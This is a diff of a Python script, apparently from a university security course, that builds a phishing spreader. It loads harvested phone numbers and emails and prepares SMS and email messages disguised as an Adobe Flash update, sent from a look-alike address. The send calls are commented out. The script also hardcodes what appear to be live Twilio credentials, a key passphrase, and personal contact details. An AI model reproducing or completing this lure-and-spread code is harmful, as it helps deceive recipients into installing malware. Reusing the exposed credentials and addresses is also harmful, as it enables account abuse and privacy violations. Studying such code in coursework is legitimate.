@@ -14,26 +14,43 @@ os.system(phone_numbers)
 os.system(emails)
 
 client = TwilioRestClient('ACb89307719aa8043871f9912452ef21c6','2f56bc2c9d8ae27afa3baf74fb46f0cb')
-#client.messages.create(from_="+12175763259",to= "+18478903346",body="ASDFQWERTY")
+
+fp1 = open('phonenumbers.txt', 'rb')
+fp2 = open('emails.txt','rb')
+fp1.seek(0)
+fp2.seek(0)
+numbers_list = []
+emails_list = []
+for number in fp1:
+	numbers_list.append(number.rstrip())
+for email in fp2:
+	emails_list.append(email.rstrip())
+
+fp1.close()
+fp2.close()
+print emails_list
+
+text_body = "Hey have you heard about the new Adobe flash update? Download it here: "
+for number in numbers_list:
+	try:
+		#client.messages.create(from_="+12175763259",to=number,body=text_body)
+		no_op = 0
+	except:
+		no_op = 0
 
 server = smtplib.SMTP()
-
-fp = open('phonenumbers.txt', 'rb')
-fp.seek(0)
-numbers = fp.read(1024)
-fp.close()
-
+numbers = "1337"
 pubkeyfp = open('public.pem', 'r')
 privkeyfp = open('private.pem','r')
 pubkey = RSA.importKey(pubkeyfp.read())
 privkey = RSA.importKey(privkeyfp.read(),passphrase='cs460')
 ciphertext = pubkey.encrypt(numbers, 0)
 plaintext = privkey.decrypt(ciphertext)
-print plaintext
-msg = MIMEText(ciphertext[0])
+#print plaintext
 
-me = "sjschmd2@illinois.edu"
-you = "pitchai2@illinois.edu"
+msg = MIMEText("Hey have you heard about the new Adobe flash update? Download it here: ")
+me = "aadoobeeflashy@gmail.com"
+you = "sjschmd2@illinois.edu"
 
 msg['Subject'] = "This is a test"
 msg['From'] = me
@@ -42,8 +59,6 @@ msg['To'] = you
 s = smtplib.SMTP('localhost')
 #s.sendmail(me, [you], msg.as_string())
 s.quit()
-
-
 
 # s = socket.socket()         # Create a socket object
 # host = '10.0.2.15'  
